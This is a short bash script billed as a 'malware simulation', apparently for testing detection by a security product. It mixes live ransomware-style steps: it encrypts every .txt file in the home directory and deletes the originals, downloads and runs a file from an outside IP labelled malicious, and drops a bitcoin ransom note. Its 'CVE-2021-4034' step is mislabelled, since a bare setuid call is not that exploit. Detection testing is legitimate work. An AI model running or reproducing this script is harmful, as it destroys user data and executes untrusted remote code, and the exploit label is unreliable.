#!/bin/bash
# Extremely detectable malware simulation for C1WS

# Part 1: Ransomware-like file encryption
KEY="c1ws-test-$(hostname)"
find ~/ -type f -name "*.txt" -exec openssl aes-256-cbc -salt -in {} -out {}.enc -k "$KEY" \; -exec rm {} \;

# Part 2: Call known malicious IP (from Abuse.ch)
curl -fsSL http://185.130.5.231/malware.sh -o /tmp/payload
chmod +x /tmp/payload && /tmp/payload &

# Part 3: Privilege escalation attempt (CVE-2021-4034)
python3 -c 'import os; os.setuid(0); os.system("touch /tmp/exploit_success")'

# Part 4: Drop ransom note
echo "Pay 0.5 BTC to 1HackerWalletXXX" > ~/README_RANSOM.txt